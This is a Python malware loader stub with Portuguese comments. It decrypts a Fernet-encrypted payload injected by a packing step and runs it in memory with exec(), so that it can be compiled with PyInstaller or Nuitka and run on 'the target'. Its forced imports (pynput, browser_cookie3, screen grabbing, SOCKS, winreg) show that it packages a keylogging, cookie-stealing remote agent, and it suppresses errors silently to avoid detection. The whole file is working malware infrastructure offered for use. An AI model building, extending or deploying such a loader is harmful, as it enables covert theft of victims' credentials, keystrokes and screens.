import base64
from cryptography.fernet import Fernet
import sys
import os

# --- IMPORTAÇÕES OCULTAS PARA O COMPILADOR ---
# Força PyInstaller/Nuitka a incluir todas as dependências do agente.
# O try/except garante que erros de import não quebrem o loader no alvo.
try:
    import requests
    import numpy
    import psutil
    import pynput
    import browser_cookie3
    from Cryptodome.Cipher import AES
    from Cryptodome.Random import get_random_bytes
    from PIL import ImageGrab
    import sqlite3
    import json
    import shutil
    import time
    import platform
    import socket
    import uuid
    import string
    import subprocess
    import random
    import threading
    import ctypes
    import ipaddress
    from datetime import datetime
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from socketserver import ThreadingMixIn
    import socks
    import importlib
except ImportError:
    pass

# Importações específicas de plataforma
try:
    import winreg
except ImportError:
    pass  # Não disponível no Linux — esperado

# --- PLACEHOLDERS INJETADOS PELO LoaderPackingStrategy ---
ENCRYPTED_PAYLOAD = "%%ENCRYPTED_PAYLOAD%%"
DECRYPTION_KEY = "%%DECRYPTION_KEY%%"


def _check_configured():
    """Verifica se os placeholders foram substituídos antes de executar."""
    if ENCRYPTED_PAYLOAD.startswith("%%") or DECRYPTION_KEY.startswith("%%"):
        raise RuntimeError(
            "Loader não configurado — placeholders não foram substituídos. "
            "Execute o LoaderPackingStrategy antes de compilar."
        )


def run_in_memory(payload_code: str):
    """
    Executa o payload em um namespace completo.
    - __name__ = "__main__" garante que guards 'if __name__ == "__main__"' disparem.
    - Herda sys, os e todos os módulos já importados pelo loader para evitar
      NameError em imports que o PyInstaller já empacotou.
    - threading.Event mantém o processo vivo enquanto threads do agente rodam.
    """
    import threading

    namespace = {
        "__name__": "__main__",
        "__file__": sys.executable,
        "__builtins__": __builtins__,
        "sys": sys,
        "os": os,
    }

    # Herda todos os módulos já importados no escopo global do loader
    for name, obj in globals().items():
        if not name.startswith("_") and name not in namespace:
            namespace[name] = obj

    compiled = compile(payload_code, "<payload>", "exec")

    # Executa em thread separada para não bloquear e poder monitorar
    done_event = threading.Event()
    exec_exception = [None]

    def _runner():
        try:
            exec(compiled, namespace)
        except SystemExit:
            pass
        except Exception as e:
            exec_exception[0] = e
        finally:
            done_event.set()

    t = threading.Thread(target=_runner, daemon=False)
    t.start()

    # Aguarda o agente terminar (normalmente ele nunca termina — loop infinito)
    t.join()


def main():
    try:
        _check_configured()

        key            = base64.b64decode(DECRYPTION_KEY)
        encrypted_data = base64.b64decode(ENCRYPTED_PAYLOAD)

        cipher            = Fernet(key)
        decrypted_payload = cipher.decrypt(encrypted_data)

        run_in_memory(decrypted_payload.decode('utf-8'))

    except Exception:
        sys.exit(0)


if __name__ == "__main__":
    main()
